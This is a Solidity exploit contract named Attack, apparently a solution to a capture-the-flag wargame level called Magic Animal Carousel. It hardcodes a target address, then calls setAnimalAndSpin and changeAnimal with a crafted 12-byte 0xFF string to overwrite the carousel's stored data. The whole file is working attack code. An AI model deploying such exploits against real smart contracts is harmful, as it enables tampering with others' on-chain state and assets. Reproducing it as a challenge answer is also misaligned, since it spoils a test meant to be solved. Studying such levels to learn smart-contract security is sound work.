// SPDX-License-Identifier: MIT

pragma solidity ^0.8.28;

interface IMagicAnimalCarousel {
    function setAnimalAndSpin (string calldata animal) external;
    function changeAnimal(string calldata animal, uint256 crateId) external;
}

// 0x5E18277bfF6271C9a4698720C16f2B277089f762

contract Attack {
    IMagicAnimalCarousel target;

    constructor(address targetAddr) {
        target = IMagicAnimalCarousel(targetAddr);
    }

    function attack() public {
        // step. 1
        target.setAnimalAndSpin("Dog");

        // step. 2
        string memory stringToSetCrateId = string(abi.encodePacked(hex"FFFFFFFFFFFFFFFFFFFFFFFF"));
        target.changeAnimal(stringToSetCrateId, 1);

        // step. 3
        target.setAnimalAndSpin("Cat");
    } 
}
